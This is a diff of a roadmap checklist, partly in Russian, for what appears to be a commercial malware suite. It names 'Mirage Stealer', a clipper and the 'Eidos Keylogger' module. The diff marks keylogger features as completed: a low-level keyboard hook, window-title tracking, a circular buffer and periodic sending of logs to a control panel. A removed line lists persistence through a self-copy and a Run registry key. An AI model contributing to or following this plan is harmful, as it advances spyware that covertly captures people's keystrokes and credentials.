@@ -120,11 +120,10 @@ Phase 15: Eidos Commercial       ░░░░░░░░░░░░░░░�
 - [ ] Может развернуть Mirage Stealer, Eidos Clipper, Eidos Keylogger
 
 ### 12.3 Eidos Keylogger (модуль внутри Mirage Stealer)
-- [ ] `keylogger/keylogger.zig` — SetWindowsHookEx(WH_KEYBOARD_LL) low-level hook
-- [ ] `keylogger/keylogger.zig` — Key buffer in memory
-- [ ] `keylogger/keylogger.zig` — Install as persistent: CopySelf + HKCU\...\Run
-- [ ] `keylogger/keylogger.zig` — Send logs to Panel every N minutes
-- [ ] `config.zig` — ENABLE_KEYLOGGER флаг (false по умолчанию)
+- [x] `keylogger/keylogger.zig` — WH_KEYBOARD_LL hook + message loop + unicode support
+- [x] `keylogger/keylogger.zig` — Window title tracking, special keys, circular buffer
+- [x] `keylogger/keylogger.zig` — Send to Panel every N minutes via existing HTTP stack
+- [x] `config.zig` — ENABLE_KEYLOGGER флаг (false по умолчанию)
 
 ---
 
